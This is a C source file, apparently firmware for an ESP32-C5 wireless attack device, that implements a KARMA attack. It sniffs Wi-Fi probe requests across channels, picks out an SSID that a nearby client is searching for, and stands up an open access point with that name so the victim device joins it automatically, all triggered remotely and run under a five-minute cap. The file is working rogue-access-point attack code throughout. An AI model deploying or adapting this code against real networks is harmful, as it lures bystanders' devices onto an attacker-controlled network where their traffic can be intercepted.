/*
 * karma.c — Tier 2 KARMA (CMD 23) for the C5.
 *
 * Automates APCLONE: sniff probe requests, harvest a directed (named) SSID a
 * nearby client is looking for, then stand up an OPEN SoftAP with that exact
 * SSID so the client auto-associates to us. = probe sniff (T1.1 parse) +
 * apclone (softap.c), gated behind the 5-min safety cap.
 *
 * Request: posei_karma_req_t { channel; duration_ms }
 *   channel = SoftAP channel (0 → ch 1, which also keeps the control link live)
 *   runs until CMD_STOP, capped at JOB_SAFETY_CAP_MS
 *
 * The harvest callback runs in the Wi-Fi driver context: it only parses,
 * bounds-/printable-checks, and copies the SSID into a static buffer behind a
 * single "got it" flag — no esp_now_send / log / LED from the callback
 * (POS-AUDIT-005/006 ISR discipline).
 */
#include "proto.h"
#include "softap.h"
#include "c5_job.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_now.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "karma";

extern volatile bool g_pause_hello;

struct karma_ctx_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  channel;        /* SoftAP channel; 0 → 1 */
    uint16_t duration_ms;
    volatile bool stop;
};
static struct karma_ctx_t * volatile s_ctx = NULL;
static volatile bool s_running = false;

/* Harvest slot, written only by the RX callback, read by the task after the
 * flag flips. Single writer + flag barrier, so no lock is needed. */
static volatile bool s_got;
static char          s_hs[33];
static volatile uint8_t s_hs_len;

static void IRAM_ATTR karma_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (s_got) return;
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 26) return;
    if ((p[0] & 0x0C) != 0x00) return;          /* management frame */
    if ((p[0] & 0xF0) != 0x40) return;          /* probe request */
    if (p[24] != 0) return;                     /* SSID element */
    uint8_t slen = p[25];
    if (slen == 0 || slen > 32) return;         /* directed probes only */
    if (len < 26 + slen) return;
    for (uint8_t i = 0; i < slen; ++i) {        /* reject non-printable garbage */
        uint8_t c = p[26 + i];
        if (c < 0x20 || c == 0x7F) return;
    }
    memcpy(s_hs, &p[26], slen);
    s_hs_len = slen;
    s_got = true;
}

static void send_status(const uint8_t *requester, uint16_t seq, uint8_t ch)
{
    wifi_sta_list_t sta = { 0 };
    esp_wifi_ap_get_sta_list(&sta);
    posei_msg_t m;
    proto_init_msg(&m, POSEI_TYPE_RESP_STATUS);
    m.seq = seq;
    uint32_t n = (uint32_t)sta.num;
    memcpy(m.payload, &n, 4);
    m.payload[4] = ch;
    m.payload_len = 5;
    proto_send_to(requester, &m);
}

static void karma_task(void *arg)
{
    struct karma_ctx_t *ctx = (struct karma_ctx_t *)arg;

    for (int i = 0; i < 30 && s_running; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    s_ctx = ctx;
    s_running = true;

    led_fx_set(LED_MODE_SCAN);
    g_pause_hello = true;
    s_got = false;
    s_hs_len = 0;

    uint8_t apch = ctx->channel ? ctx->channel : 1;
    char ssid[33] = { 0 };   /* harvested SSID; hoisted above the gotos below */

    /* ---- Phase 1: harvest a directed probe SSID (hop 1..13). ---- */
    ESP_LOGI(TAG, "karma: sniffing for a directed probe SSID");
    esp_wifi_set_promiscuous(false);
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(karma_cb);
    esp_wifi_set_promiscuous(true);

    uint32_t sniff_end = xTaskGetTickCount() + pdMS_TO_TICKS(15000);
    uint8_t hop = 1;
    while (!ctx->stop && !s_got && xTaskGetTickCount() < sniff_end) {
        hop = (hop >= 13) ? 1 : hop + 1;
        esp_wifi_set_channel(hop, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    if (!s_got) {
        ESP_LOGW(TAG, "karma: no directed probe heard, nothing to clone");
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        send_status(ctx->requester, ctx->seq, apch);
        goto done;
    }

    uint8_t slen = s_hs_len; if (slen > 32) slen = 32;
    memcpy(ssid, s_hs, slen);
    ESP_LOGI(TAG, "karma: cloning '%s' on ch %u", ssid, apch);

    /* ---- Phase 2: clone it as an OPEN SoftAP. ---- */
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    send_status(ctx->requester, ctx->seq, apch);   /* ack while reachable */

    if (softap_up(ssid, true, NULL, apch) != ESP_OK) {
        led_fx_set(LED_MODE_ERROR);
        softap_down();
        goto done;
    }
    led_fx_set(LED_MODE_ATTACK);

    uint32_t end = xTaskGetTickCount() +
                   pdMS_TO_TICKS(job_effective_ms(ctx->duration_ms, JOB_SAFETY_CAP_MS));
    while (!ctx->stop && xTaskGetTickCount() < end) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (apch == 1 && !ctx->stop)
            send_status(ctx->requester, ctx->seq, apch);
    }
    softap_down();

done:
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    send_status(ctx->requester, ctx->seq, apch);
    if (s_ctx == ctx) {
        led_fx_set(LED_MODE_IDLE);
        g_pause_hello = false;
        s_ctx = NULL;
    }
    s_running = false;
    free(ctx);
    vTaskDelete(NULL);
}

void karma_start(const uint8_t requester[6], const posei_karma_req_t *req, uint16_t seq)
{
    if (s_ctx) {
        s_ctx->stop = true;
        esp_wifi_set_promiscuous_rx_cb(NULL);   /* drop the harvest cb before retiring */
        vTaskDelay(pdMS_TO_TICKS(120));
    }

    struct karma_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) { led_fx_set(LED_MODE_ERROR); return; }
    memcpy(ctx->requester, requester, 6);
    ctx->seq         = seq;
    ctx->channel     = req->channel;
    ctx->duration_ms = req->duration_ms;
    ctx->stop        = false;

    if (xTaskCreate(karma_task, "karma", 4096, ctx, 4, NULL) != pdPASS) {
        ESP_LOGE(TAG, "xTaskCreate failed");
        free(ctx);
        led_fx_set(LED_MODE_ERROR);
    }
}

void karma_stop(void)
{
    if (s_ctx) s_ctx->stop = true;
}
